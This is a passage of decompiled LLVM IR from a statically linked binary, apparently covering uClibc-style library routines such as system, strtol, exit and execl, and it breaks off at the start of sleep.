  %v4_1707c = sdiv i32 %v3_17078, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_17084 = mul i32 %v4_1707c, 5
  %v5_17084 = add i32 %v4_17084, %v0_17070
  store i32 %v5_17084, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1708c = load i32, i32* @r7, align 4
  %v2_1708c = inttoptr i32 %v1_1708c to i32*
  store i32 0, i32* %v2_1708c, align 4
  %v1_17094 = load i32, i32* %r3.global-to-local, align 4
  %v2_17094 = load i32, i32* @r7, align 4
  %v3_17094 = inttoptr i32 %v2_17094 to i32*
  store i32 %v1_17094, i32* %v3_17094, align 4
  %v17_17098.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_17098 = phi i32 [ %v1_17090, %bb26 ], [ %v17_17098.pre, %.thread4 ]
  %v2_17098 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17098, i32* %r4.global-to-local, align 4
  ret i32 %v17_17098

dec_label_pc_1709c:                               ; preds = %dec_label_pc_17020
  %v0_1709c = call i32 @__errno_location()
  store i32 %v0_1709c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_170a4 = inttoptr i32 %v0_1709c to i32*
  store i32 22, i32* %v2_170a4, align 4
  %v0_170a8 = call i32 @__errno_location()
  %v0_170ac = load i32, i32* %r4.global-to-local, align 4
  %v2_170ac = inttoptr i32 %v0_170a8 to i32*
  store i32 %v0_170ac, i32* %v2_170ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_170b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_170b4, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_17030, { 1, 0 }
  uselistorder i1 %v7_17008, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22c34.1478 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22c34.1478 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_170bc = load i32, i32* @r4, align 4
  %v0_170c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_170c0 = icmp eq i32 %v0_170c0, 0
  br i1 %v2_170c0, label %bb, label %dec_label_pc_170d4

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171e0

dec_label_pc_170d4:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_170dc = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_170ec = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_170fc = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_170fc, i32* %r0.global-to-local, align 4
  %v0_17104 = call i32 @__vfork()
  store i32 %v0_17104, i32* %r0.global-to-local, align 4
  store i32 %v0_17104, i32* @r4, align 4
  %v1_17108 = icmp slt i32 %v0_17104, 0
  br i1 %v1_17108, label %dec_label_pc_17110, label %dec_label_pc_1713c

dec_label_pc_17110:                               ; preds = %dec_label_pc_170d4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17118 = call i32 @__bsd_signal(i32 3, i32 %v2_170dc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17124 = call i32 @__bsd_signal(i32 2, i32 %v2_170ec)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17130 = call i32 @__bsd_signal(i32 17, i32 %v2_170fc)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171e0

dec_label_pc_1713c:                               ; preds = %dec_label_pc_170d4
  %v2_17108 = icmp eq i32 %v0_17104, 0
  br i1 %v2_17108, label %dec_label_pc_17140, label %dec_label_pc_17184

dec_label_pc_17140:                               ; preds = %dec_label_pc_1713c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17148 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_1714c = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17154 = call i32 @__bsd_signal(i32 2, i32 %v0_1714c)
  %v0_17158 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17160 = call i32 @__bsd_signal(i32 17, i32 %v0_17158)
  store i32 ptrtoint ([8 x i8]* @global_var_22c5c.1486 to i32), i32* @r0, align 4
  %v0_17174 = load i32, i32* @r4, align 4
  %v8_17178 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_22c5c.1486 to i32), i32 ptrtoint ([3 x i8]* @global_var_22c64.1488 to i32), i32 ptrtoint ([3 x i8]* @global_var_22c68.1490 to i32), i32 %v0_170c0, i32 %v0_17174)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_17180 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_17184:                               ; preds = %dec_label_pc_1713c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1718c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17198 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_171a8 = load i32, i32* @r4, align 4
  store i32 %v0_171a8, i32* %r0.global-to-local, align 4
  %v0_171ac = call i32 @wait4()
  store i32 %v0_171ac, i32* %r0.global-to-local, align 4
  %v7_171b0 = icmp eq i32 %v0_171ac, -1
  br i1 %v7_171b0, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_17184
  store i32 %v0_171ac, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_17184, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_171c0 = call i32 @__bsd_signal(i32 3, i32 %v2_170dc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_171cc = call i32 @__bsd_signal(i32 2, i32 %v2_170ec)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_171d8 = call i32 @__bsd_signal(i32 17, i32 %v2_170fc)
  %v3_171dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_171dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171e0

dec_label_pc_171e0:                               ; preds = %bb, %dec_label_pc_17110, %bb11
  %v8_171e4 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_17110 ], [ %v3_171dc, %bb11 ]
  store i32 %v3_170bc, i32* @r4, align 4
  ret i32 %v8_171e4

; uselistorder directives
  uselistorder i32 %v0_171ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_171e0, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_171fc = call i32 @strtol()
  ret i32 %v0_171fc
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_17204 = call i32 @_stdlib_strto_l()
  ret i32 %v0_17204
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17208 = load i32, i32* @r4, align 4
  store i32 %v3_17208, i32* %stack_var_-36, align 4
  %v0_1720c = load i32, i32* @r1, align 4
  store i32 %v0_1720c, i32* %sb.global-to-local, align 4
  %v0_17210 = load i32, i32* @r2, align 4
  store i32 %v0_17210, i32* %r5.global-to-local, align 4
  %v0_17214 = load i32, i32* @r3, align 4
  store i32 %v0_17214, i32* %fp.global-to-local, align 4
  %v0_17218 = load i32, i32* @r0, align 4
  %v2_1722c.pre = load i32, i32* @global_var_2b254, align 4
  br label %dec_label_pc_17224

dec_label_pc_17224:                               ; preds = %dec_label_pc_17224, %entry
  %v0_1725c = phi i32 [ %v0_17218, %entry ], [ %v1_17220, %dec_label_pc_17224 ]
  store i32 %v0_1725c, i32* %r4.global-to-local, align 4
  %v1_17228 = inttoptr i32 %v0_1725c to i8*
  %v2_17228 = load i8, i8* %v1_17228, align 1
  %v3_17228 = zext i8 %v2_17228 to i32
  %v3_17230 = mul nuw nsw i32 %v3_17228, 2
  %v4_17230 = add i32 %v3_17230, %v2_1722c.pre
  %v5_17230 = inttoptr i32 %v4_17230 to i8*
  %v6_17230 = load i8, i8* %v5_17230, align 1
  %v1_17234 = and i8 %v6_17230, 32
  %v2_17234 = icmp eq i8 %v1_17234, 0
  %v1_17220 = add i32 %v0_1725c, 1
  br i1 %v2_17234, label %dec_label_pc_1723c, label %dec_label_pc_17224

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17224
  %v7_1723c = icmp eq i8 %v2_17228, 43
  br i1 %v7_1723c, label %dec_label_pc_1725c, label %dec_label_pc_17244

dec_label_pc_17244:                               ; preds = %dec_label_pc_1723c
  %v7_17244 = icmp eq i8 %v2_17228, 45
  br i1 %v7_17244, label %dec_label_pc_1725c, label %bb

bb:                                               ; preds = %dec_label_pc_17244
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17260

dec_label_pc_1725c:                               ; preds = %dec_label_pc_1723c, %dec_label_pc_17244
  %storemerge43 = phi i32 [ 1, %dec_label_pc_17244 ], [ 0, %dec_label_pc_1723c ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_17220, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17260

dec_label_pc_17260:                               ; preds = %bb, %dec_label_pc_1725c
  %v0_17280 = phi i32 [ %v0_1725c, %bb ], [ %v1_17220, %dec_label_pc_1725c ]
  %v1_17260 = and i32 %v0_17210, -17
  %v3_17260 = icmp eq i32 %v1_17260, 0
  br i1 %v3_17260, label %dec_label_pc_1726c, label %bb54

bb54:                                             ; preds = %dec_label_pc_17260
  br label %bb58

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17260
  %v1_1726c = inttoptr i32 %v0_17280 to i8*
  %v2_1726c = load i8, i8* %v1_1726c, align 1
  %v7_17270 = icmp eq i8 %v2_1726c, 48
  %v1_17274 = add i32 %v0_17210, 10
  store i32 %v1_17274, i32* %r5.global-to-local, align 4
  br i1 %v7_17270, label %dec_label_pc_17280, label %bb55

bb55:                                             ; preds = %dec_label_pc_1726c
  br label %.thread8

dec_label_pc_17280:                               ; preds = %dec_label_pc_1726c
  %v1_17280 = add i32 %v0_17280, 1
  %v2_17280 = inttoptr i32 %v1_17280 to i8*
  %v3_17280 = load i8, i8* %v2_17280, align 1
  %v4_17280 = zext i8 %v3_17280 to i32
  store i32 %v1_17280, i32* %r4.global-to-local, align 4
  %v1_17284 = or i32 %v4_17280, 32
  %v7_17288 = icmp eq i32 %v1_17284, 120
  %v1_1728c = add i32 %v0_17210, 8
  store i32 %v1_1728c, i32* %r5.global-to-local, align 4
  br i1 %v7_17288, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_17280
  %v3_17298 = mul i32 %v1_1728c, 2
  store i32 %v3_17298, i32* %r5.global-to-local, align 4
  %v2_1729c = add i32 %v0_17280, 2
  store i32 %v2_1729c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17280, %bb55, %bb56
  %v1_1736028 = phi i32 [ %v0_17218, %bb55 ], [ %v1_17280, %bb56 ], [ %v1_17280, %dec_label_pc_17280 ]
  %v0_172e819 = phi i32 [ %v0_17280, %bb55 ], [ %v2_1729c, %bb56 ], [ %v1_17280, %dec_label_pc_17280 ]
  %v0_172a0 = phi i32 [ %v1_17274, %bb55 ], [ %v3_17298, %bb56 ], [ %v1_1728c, %dec_label_pc_17280 ]
  %v5_172a4 = icmp slt i32 %v0_172a0, 16
  br i1 %v5_172a4, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_1736027 = phi i32 [ %v0_17218, %bb54 ], [ %v1_1736028, %.thread8 ], [ %v1_1736028, %bb57 ]
  %v0_172e818 = phi i32 [ %v0_17280, %bb54 ], [ %v0_172e819, %.thread8 ], [ %v0_172e819, %bb57 ]
  %v0_172b8 = phi i32 [ %v0_17210, %bb54 ], [ %v0_172a0, %.thread8 ], [ 16, %bb57 ]
  %v1_172a8 = add i32 %v0_172b8, -2
  %tmp = icmp ugt i32 %v1_172a8, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_172b8

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1735c

dec_label_pc_172b8:                               ; preds = %bb58
  %v2_172c0 = urem i32 -1, %v0_172b8
  %v1_172d0 = urem i32 %v2_172c0, 256
  store i32 %v1_172d0, i32* %sl.global-to-local, align 4
  %v2_172d4 = udiv i32 -1, %v0_172b8
  store i32 0, i32* @ip, align 4
  store i32 %v2_172d4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_172e8

dec_label_pc_172e4:                               ; preds = %bb65, %dec_label_pc_17344
  %v0_172e4 = phi i32 [ %v1_17314, %bb65 ], [ %v0_172e4.pre, %dec_label_pc_17344 ]
  br label %dec_label_pc_172e8

dec_label_pc_172e8:                               ; preds = %dec_label_pc_172b8, %dec_label_pc_172e4
  %v1_1736025 = phi i32 [ %v1_1736027, %dec_label_pc_172b8 ], [ %v0_172e4, %dec_label_pc_172e4 ]
  %v0_17314 = phi i32 [ %v0_172e818, %dec_label_pc_172b8 ], [ %v0_172e4, %dec_label_pc_172e4 ]
  %v1_172e8 = inttoptr i32 %v0_17314 to i8*
  %v2_172e8 = load i8, i8* %v1_172e8, align 1
  %v3_172e8 = zext i8 %v2_172e8 to i32
  %v1_172ec = add nsw i32 %v3_172e8, -48
  %v1_172f0 = urem i32 %v1_172ec, 256
  %v1_172f8 = or i32 %v3_172e8, 32
  %tmp73 = icmp ult i32 %v1_172f0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_17300

dec_label_pc_17300:                               ; preds = %dec_label_pc_172e8
  %tmp74 = icmp ugt i32 %v1_172f8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_17300
  %v1_17304 = add nsw i32 %v1_172f8, -87
  %v5_1730c = urem i32 %v1_17304, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_172e8, %dec_label_pc_17300, %bb59
  %v3_1733c = phi i32 [ %v1_172f0, %dec_label_pc_172e8 ], [ 40, %dec_label_pc_17300 ], [ %v5_1730c, %bb59 ]
  %v1_17310 = load i32, i32* %r5.global-to-local, align 4
  %v1_17314 = add i32 %v0_17314, 1
  store i32 %v1_17314, i32* %r4.global-to-local, align 4
  %v6_17318 = icmp slt i32 %v3_1733c, %v1_17310
  br i1 %v6_17318, label %dec_label_pc_1731c, label %dec_label_pc_1735c.loopexit

dec_label_pc_1731c:                               ; preds = %bb60
  %v0_1731c = load i32, i32* @ip, align 4
  %v1_1731c = load i32, i32* %r8.global-to-local, align 4
  %v9_1731c = icmp eq i32 %v0_1731c, %v1_1731c
  br i1 %v9_1731c, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_1731c
  br label %dec_label_pc_1732c

bb61:                                             ; preds = %dec_label_pc_1731c
  %v3_1731c = icmp ult i32 %v0_1731c, %v1_1731c
  br i1 %v3_1731c, label %dec_label_pc_1732c, label %dec_label_pc_17344

dec_label_pc_1732c:                               ; preds = %bb61, %.thread37
  %v4_173342240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_1732c = load i32, i32* %sl.global-to-local, align 4
  %v3_1732c = icmp uge i32 %v3_1733c, %v1_1732c
  %v9_1732c = icmp eq i32 %v3_1733c, %v1_1732c
  %v2_17330 = xor i1 %v3_1732c, true
  %v3_17330 = or i1 %v9_1732c, %v2_17330
  br i1 %v3_17330, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1732c
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1732c, %bb62
  %v4_17334 = phi i32 [ %v4_173342240, %dec_label_pc_1732c ], [ 0, %bb62 ]
  %v2_17334 = xor i1 %v9_1732c, true
  %v3_17334 = and i1 %v3_1732c, %v2_17334
  br i1 %v3_17334, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_17334 = urem i32 %v4_17334, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_17338 = phi i32 [ %v5_17334, %bb64 ], [ %v4_17334, %bb63 ]
  %v2_17338 = icmp eq i32 %v0_17338, 0
  br i1 %v2_17338, label %bb65, label %dec_label_pc_17344

bb65:                                             ; preds = %thread-pre-split
  %v4_1733c = mul i32 %v0_1731c, %v1_17310
  %v5_1733c = add i32 %v4_1733c, %v3_1733c
  store i32 %v5_1733c, i32* @ip, align 4
  br label %dec_label_pc_172e4

dec_label_pc_17344:                               ; preds = %bb61, %thread-pre-split
  %v0_17344 = call i32 @__errno_location()
  %v0_17348 = load i32, i32* %r7.global-to-local, align 4
  %v1_17348 = load i32, i32* %fp.global-to-local, align 4
  %v2_17348 = and i32 %v1_17348, %v0_17348
  store i32 %v2_17348, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_17354 = inttoptr i32 %v0_17344 to i32*
  store i32 34, i32* %v2_17354, align 4
  %v0_172e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_172e4

dec_label_pc_1735c.loopexit:                      ; preds = %bb60
  %v0_1735c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1735c

dec_label_pc_1735c:                               ; preds = %.thread, %dec_label_pc_1735c.loopexit
  %v1_17360 = phi i32 [ %v1_1736025, %dec_label_pc_1735c.loopexit ], [ %v1_1736027, %.thread ]
  %v2_17360 = phi i32 [ %v0_1735c.pre, %dec_label_pc_1735c.loopexit ], [ %v0_1720c, %.thread ]
  %v2_1735c = icmp eq i32 %v2_17360, 0
  br i1 %v2_1735c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_1735c
  %v3_17360 = inttoptr i32 %v2_17360 to i32*
  store i32 %v1_17360, i32* %v3_17360, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_1735c, %bb66
  %v0_17364 = load i32, i32* %r7.global-to-local, align 4
  %v2_17364 = icmp eq i32 %v0_17364, 0
  %. = select i1 %v2_17364, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_17370 = load i32, i32* %fp.global-to-local, align 4
  %v2_17370 = icmp eq i32 %v0_17370, 0
  %v0_17394.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17370, label %dec_label_pc_1738c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_17394.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1737c, label %dec_label_pc_1738c

dec_label_pc_1737c:                               ; preds = %bb70
  %v0_1737c = call i32 @__errno_location()
  %v2_17384 = inttoptr i32 %v0_1737c to i32*
  store i32 34, i32* %v2_17384, align 4
  %v0_17388 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17388, i32* @ip, align 4
  %v0_1738c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1738c

dec_label_pc_1738c:                               ; preds = %bb70, %bb67, %dec_label_pc_1737c
  %v0_17394.pre = phi i32 [ %v0_17394.pre.pre, %bb70 ], [ %v0_17388, %dec_label_pc_1737c ], [ %v0_17394.pre.pre, %bb67 ]
  %v0_1738c = phi i32 [ %v0_17364, %bb70 ], [ %v0_1738c.pre, %dec_label_pc_1737c ], [ %v0_17364, %bb67 ]
  %v2_1738c = icmp eq i32 %v0_1738c, 0
  br i1 %v2_1738c, label %dec_label_pc_1738c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1738c
  %v2_17390 = sub i32 0, %v0_17394.pre
  store i32 %v2_17390, i32* @ip, align 4
  br label %dec_label_pc_1738c._crit_edge

dec_label_pc_1738c._crit_edge:                    ; preds = %dec_label_pc_1738c, %bb71
  %v0_17394 = phi i32 [ %v2_17390, %bb71 ], [ %v0_17394.pre, %dec_label_pc_1738c ]
  %v2_17398 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17398, i32* @r4, align 4
  ret i32 %v0_17394

; uselistorder directives
  uselistorder i32 %v0_17394.pre, { 1, 0 }
  uselistorder i32 %v0_17394.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_17334, { 1, 0 }
  uselistorder i1 %v3_1732c, { 1, 0 }
  uselistorder i32 %v1_1732c, { 1, 0 }
  uselistorder i32 %v1_17314, { 1, 0 }
  uselistorder i32 %v1_172f8, { 1, 0 }
  uselistorder i32 %v1_172f0, { 1, 0 }
  uselistorder i32 %v0_172e4, { 1, 0 }
  uselistorder i32 %v0_172b8, { 1, 0, 2 }
  uselistorder i32 %v3_17298, { 1, 0 }
  uselistorder i32 %v1_1728c, { 1, 0, 2 }
  uselistorder i32 %v0_17280, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_17220, { 1, 0, 2 }
  uselistorder i32 %v0_17218, { 1, 0, 2 }
  uselistorder i32 %v0_17210, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1738c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1738c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_1735c, { 1, 0 }
  uselistorder label %dec_label_pc_17344, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_172e8, { 1, 0 }
  uselistorder label %dec_label_pc_172e4, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17260, { 1, 0 }
  uselistorder label %dec_label_pc_1725c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_173a0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_173a0, i32* @r0, align 4
  %v1_173bc = call i32 @__pthread_return_void()
  %v1_173cc = call i32 @__pthread_return_0()
  %v2_173d4 = load i32, i32* @global_var_31804.1498, align 4
  %v2_173d8 = icmp eq i32 %v2_173d4, 0
  br i1 %v2_173d8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_173d4)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_173a0, i32* @r0, align 4
  %v1_173f8 = call i32 @__pthread_return_void()
  store i32 %v1_173f8, i32* @r0, align 4
  %v1_173fc = call i32 @__GI___uClibc_fini(i32 %v1_173f8)
  store i32 95248, i32* @lr, align 4
  %v2_1740c = call i32 @_stdio_term()
  %v0_17410 = load i32, i32* @r4, align 4
  %v1_17414 = call i32 @__GI__exit(i32 %v0_17410)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 10, 24, 23, 9, 8, 7, 6, 5, 4, 3, 2, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_17434 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17434, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_17444 = ptrtoint i32* %stack_var_-32 to i32
  %v2_17448 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_17448, i32* %stack_var_-32, align 4
  br label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %dec_label_pc_17454, %entry
  %v0_17468 = phi i32 [ %v1_17468, %dec_label_pc_17454 ], [ 0, %entry ]
  %v3_17454 = phi i32 [ %v1_1745c, %dec_label_pc_17454 ], [ %v2_17448, %entry ]
  %v1_17458 = inttoptr i32 %v3_17454 to i32*
  %v2_17458 = load i32, i32* %v1_17458, align 4
  %v1_1745c = add i32 %v3_17454, 4
  %v2_17460 = icmp eq i32 %v2_17458, 0
  store i32 %v1_1745c, i32* %stack_var_-32, align 4
  %v1_17468 = add i32 %v0_17468, 1
  store i32 %v1_17468, i32* @lr, align 4
  br i1 %v2_17460, label %dec_label_pc_17470, label %dec_label_pc_17454

dec_label_pc_17470:                               ; preds = %dec_label_pc_17454
  %v3_17470.neg = mul i32 %v1_17468, -4
  %v1_17474.neg = add i32 %v2_17444, -8
  %v2_17478 = add i32 %v1_17474.neg, %v3_17470.neg
  %v2_17480 = inttoptr i32 %v2_17478 to i32*
  store i32 %arg1, i32* %v2_17480, align 4
  store i32 %v2_17448, i32* %stack_var_-32, align 4
  %v0_1748c = load i32, i32* @sp, align 4
  store i32 %v0_1748c, i32* @r1, align 4
  store i32 %v0_1748c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %dec_label_pc_17494.dec_label_pc_17494_crit_edge, %dec_label_pc_17470
  %v1_174a8 = phi i32 [ %v5_174a8, %dec_label_pc_17494.dec_label_pc_17494_crit_edge ], [ %v0_1748c, %dec_label_pc_17470 ]
  %v3_17494 = phi i32 [ %v3_17494.pre, %dec_label_pc_17494.dec_label_pc_17494_crit_edge ], [ %v2_17448, %dec_label_pc_17470 ]
  %v1_17498 = inttoptr i32 %v3_17494 to i32*
  %v2_17498 = load i32, i32* %v1_17498, align 4
  %v0_1749c = load i32, i32* @lr, align 4
  %v1_1749c = add i32 %v0_1749c, -1
  store i32 %v1_1749c, i32* @lr, align 4
  %v7_1749c = icmp eq i32 %v0_1749c, 1
  %v1_174a0 = add i32 %v3_17494, 4
  store i32 %v1_174a0, i32* %stack_var_-32, align 4
  %v2_174a8 = add i32 %v1_174a8, 4
  %v3_174a8 = inttoptr i32 %v2_174a8 to i32*
  store i32 %v2_17498, i32* %v3_174a8, align 4
  %v4_174a8 = load i32, i32* %ip.global-to-local, align 4
  %v5_174a8 = add i32 %v4_174a8, 4
  store i32 %v5_174a8, i32* %ip.global-to-local, align 4
  br i1 %v7_1749c, label %dec_label_pc_174b0, label %dec_label_pc_17494.dec_label_pc_17494_crit_edge

dec_label_pc_17494.dec_label_pc_17494_crit_edge:  ; preds = %dec_label_pc_17494
  %v3_17494.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_17494

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17494
  %v2_174b4 = load i32, i32* @global_var_3180c.1503, align 4
  store i32 %v2_174b4, i32* @r2, align 4
  %v0_174b8 = call i32 @__GI_execve()
  ret i32 %v0_174b8

; uselistorder directives
  uselistorder i32 %v5_174a8, { 1, 0 }
  uselistorder i32 %v0_1749c, { 1, 0 }
  uselistorder i32 %v1_17468, { 0, 2, 1 }
  uselistorder i32 %v1_1745c, { 1, 0 }
  uselistorder i32 %v3_17454, { 1, 0 }
  uselistorder i32 %v2_17448, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_174c8 = load i32, i32* @r4, align 4
